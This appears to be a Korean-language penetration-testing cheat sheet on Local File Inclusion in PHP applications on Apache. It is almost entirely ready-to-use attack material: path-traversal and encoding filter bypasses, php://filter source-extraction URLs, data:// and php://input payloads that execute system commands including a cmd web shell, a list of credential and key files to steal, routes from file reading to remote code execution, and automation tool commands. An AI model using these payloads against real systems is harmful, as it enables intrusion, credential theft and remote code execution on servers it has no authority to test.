# 02_LFI

# Apache — LFI (Local File Inclusion)

PHP 파일 포함 취약점. `include()`, `require()`, `include_once()` 등에서 사용자 입력이 필터링 없이 사용될 때 발생.

---

## 기본 탐지

```bash
# 파라미터 찾기 (흔한 이름들)
http://<IP>/index.php?page=
http://<IP>/index.php?file=
http://<IP>/index.php?include=
http://<IP>/index.php?path=
http://<IP>/index.php?template=
http://<IP>/index.php?view=
http://<IP>/index.php?doc=
http://<IP>/index.php?load=

# 기본 페이로드
http://<IP>/index.php?page=../../../../etc/passwd
http://<IP>/index.php?page=/etc/passwd
```

---

## 필터 우회

```bash
# ../ 필터 우회
http://<IP>/index.php?page=....//....//....//etc/passwd
http://<IP>/index.php?page=....\/....\/etc/passwd

# URL 인코딩
http://<IP>/index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 더블 인코딩
http://<IP>/index.php?page=..%252f..%252fetc%252fpasswd

# null byte (PHP < 5.3.4)
http://<IP>/index.php?page=../../../../etc/passwd%00
http://<IP>/index.php?page=../../../../etc/passwd%00.php

# 경로 절단 (PHP < 5.3)
http://<IP>/index.php?page=../../../../etc/passwd.....................................

# 깊이 늘리기
http://<IP>/index.php?page=../../../../../../../../../../etc/passwd
```

---

## PHP Wrapper

```bash
# ★ base64로 PHP 소스코드 추출 (가장 자주 사용)
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=config
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=../wp-config
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

# 디코딩
echo "BASE64HERE" | base64 -d

# ROT13 변환
http://<IP>/index.php?page=php://filter/read=string.rot13/resource=index.php

# 연쇄 필터 (필터 우회)
http://<IP>/index.php?page=php://filter/convert.iconv.UTF-8.UTF-16/convert.base64-encode/resource=index

# data:// (allow_url_include=On 필요)
http://<IP>/index.php?page=data://text/plain,<?php system('id'); ?>
http://<IP>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# php://input (POST body 실행)
curl -X POST -d "<?php system('id'); ?>" "http://<IP>/index.php?page=php://input"
curl -X POST -d "<?php system(\$_GET['cmd']); ?>" "http://<IP>/index.php?page=php://input&cmd=whoami"

# expect:// (PHP expect 모듈, 드물음)
http://<IP>/index.php?page=expect://id
```

---

## 읽을 수 있는 유용한 파일

```bash
# 자격증명
/etc/passwd
/etc/shadow                     # root 필요
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
/root/.ssh/id_rsa

# 시스템 정보
/etc/issue
/etc/os-release
/proc/version
/proc/self/environ              # 환경변수 (포이즈닝 가능)
/proc/self/cmdline

# 웹 설정 (DB 자격증명)
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config.php
/var/www/html/database.php
/var/www/html/settings.php
/var/www/html/configuration.php  # Joomla

# Apache 로그 (포이즈닝 대상)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log

# SSH 알려진 호스트
/home/<user>/.bash_history
/home/<user>/.bashrc
/root/.bash_history
```

---

## LFI → RCE 경로

LFI 자체는 파일 읽기이지만, 아래 방법으로 RCE로 승격 가능:

- **로그 포이즈닝** → 별도 페이지 참고
- **php://input** → POST body에 PHP 코드 실행
- **data://** → URL에 PHP 코드 직접 삽입
- **/proc/self/environ** → User-Agent에 PHP 주입 후 include
- **phpinfo() 파일 + 경쟁조건** → 고급 기법
- **파일 업로드 + LFI** → 업로드한 이미지에 PHP 삽입 후 LFI로 include

---

## 자동화 도구

```bash
# LFImap
python3 lfimap.py -U "http://<IP>/index.php?page=PWD" -a

# fimap
python2 fimap.py -u "http://<IP>/index.php?page=test"

# Burp Suite Intruder — LFI-Jhaddix.txt 워드리스트 사용
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```